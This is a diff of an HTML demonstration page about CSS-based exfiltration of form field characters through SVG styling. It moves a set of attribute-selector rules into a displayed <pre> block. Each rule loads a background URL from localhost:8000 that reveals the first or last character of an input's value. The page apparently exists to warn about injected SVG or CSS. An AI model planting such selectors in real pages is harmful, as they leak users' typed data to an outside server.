@@ -6,78 +6,6 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title> CSS Field Character Exfiltration (security) via SVG Styling</title>
-
-  <style>
-    /* 
-input[name='getWord'][value$='a'] {
-  border: 5px solid aqua;
-  background: url('http://localhost:8000/?OriginalLastChar=a');
-}
-input[name='getWord'][value^='a'] {
-  border: 5px solid aqua;
-  background: url('http://localhost:8000/?OriginalFirstChar=a');
-}
-input[name='getWord'][value$='b'] {
-  border: 5px solid blue;
-  background: url('http://localhost:8000/?OriginalLastChar=b');
-}
-input[name='getWord'][value^='b'] {
-  border: 5px solid blue;
-  background: url('http://localhost:8000/?OriginalFirstChar=b');
-}
-input[name='getWord'][value$='c'] {
-  border: 5px solid green;
-  background: url('http://localhost:8000/?OriginalLastChar=c');
-}
-input[name='getWord'][value^='c'] {
-  border: 5px solid green;
-  background: url('http://localhost:8000/?OriginalFirstChar=c');
-}
-input[name='getWord'][value$='d'] {
-  border: 5px solid purple;
-  background: url('http://localhost:8000/?OriginalLastChar=d');
-}
-input[name='getWord'][value^='d'] {
-  border: 5px solid purple;
-  background: url('http://localhost:8000/?OriginalFirstChar=d');
-}
-// Changed input 
-input[name='changed'][value$='a'] {
-  border: 5px solid aqua;
-  background: url('http://localhost:8000/?ChangedLastChar=a');
-}
-input[name='changed'][value^='a'] {
-  border: 5px solid aqua;
-  background: url('http://localhost:8000/?ChangedFirstChar=a');
-}
-input[name='changed'][value$='b'] {
-  border: 5px solid blue;
-  background: url('http://localhost:8000/?ChangedLastChar=b');
-}
-input[name='changed'][value^='b'] {
-  border: 5px solid blue;
-  background: url('http://localhost:8000/?ChangedFirstChar=b');
-}
-input[name='changed'][value$='c'] {
-  border: 5px solid green;
-  background: url('http://localhost:8000/?ChangedLastChar=c');
-}
-input[name='changed'][value^='c'] {
-  border: 5px solid green;
-  background: url('http://localhost:8000/?ChangedFirstChar=c');
-}
-input[name='changed'][value$='d'] {
-  border: 5px solid purple;
-  background: url('http://localhost:8000/?ChangedLastChar=d');
-}
-input[name='changed'][value^='d'] {
-  border: 5px solid purple;
-  background: url('http://localhost:8000/?ChangedFirstChar=d');
-}
-*/ 
-  </style>
-
-  
 </head>
 <body>
   
@@ -184,6 +112,78 @@ Worried about folk injecting svgs, like
 <a href="https://github.com/iconfu/svg-inject">svg-inject</a> or css directly
 into their site as the styling can be used to pull info from the page.
 </pre>
+<pre> Inside the svg 
+        circle {
+          fill: gold;
+          stroke: maroon;
+          stroke-width: 2px;
+        }
+    input[name='getWord'][value$='a'] {
+      border: 5px solid aqua;
+      background: url('http://localhost:8000/?OriginalLastChar=a');
+    }
+    input[name='getWord'][value^='a'] {
+      border: 5px solid aqua;
+      background: url('http://localhost:8000/?OriginalFirstChar=a');
+    }
+    input[name='getWord'][value$='b'] {
+      border: 5px solid blue;
+      background: url('http://localhost:8000/?OriginalLastChar=b');
+    }
+    input[name='getWord'][value^='b'] {
+      border: 5px solid blue;
+      background: url('http://localhost:8000/?OriginalFirstChar=b');
+    }
+    input[name='getWord'][value$='c'] {
+      border: 5px solid green;
+      background: url('http://localhost:8000/?OriginalLastChar=c');
+    }
+    input[name='getWord'][value^='c'] {
+      border: 5px solid green;
+      background: url('http://localhost:8000/?OriginalFirstChar=c');
+    }
+    input[name='getWord'][value$='d'] {
+      border: 5px solid purple;
+      background: url('http://localhost:8000/?OriginalLastChar=d');
+    }
+    input[name='getWord'][value^='d'] {
+      border: 5px solid purple;
+      background: url('http://localhost:8000/?OriginalFirstChar=d');
+    }
+    /**** Changed input  ****/
+    input[name='changed'][value$='a'] {
+      border: 5px solid aqua;
+      background: url('http://localhost:8000/?ChangedLastChar=a');
+    }
+    input[name='changed'][value^='a'] {
+      border: 5px solid aqua;
+      background: url('http://localhost:8000/?ChangedFirstChar=a');
+    }
+    input[name='changed'][value$='b'] {
+      border: 5px solid blue;
+      background: url('http://localhost:8000/?ChangedLastChar=b');
+    }
+    input[name='changed'][value^='b'] {
+      border: 5px solid blue;
+      background: url('http://localhost:8000/?ChangedFirstChar=b');
+    }
+    input[name='changed'][value$='c'] {
+      border: 5px solid green;
+      background: url('http://localhost:8000/?ChangedLastChar=c');
+    }
+    input[name='changed'][value^='c'] {
+      border: 5px solid green;
+      background: url('http://localhost:8000/?ChangedFirstChar=c');
+    }
+    input[name='changed'][value$='d'] {
+      border: 5px solid purple;
+      background: url('http://localhost:8000/?ChangedLastChar=d');
+    }
+    input[name='changed'][value^='d'] {
+      border: 5px solid purple;
+      background: url('http://localhost:8000/?ChangedFirstChar=d');
+    }
+ </pre>
 
 
   <script>
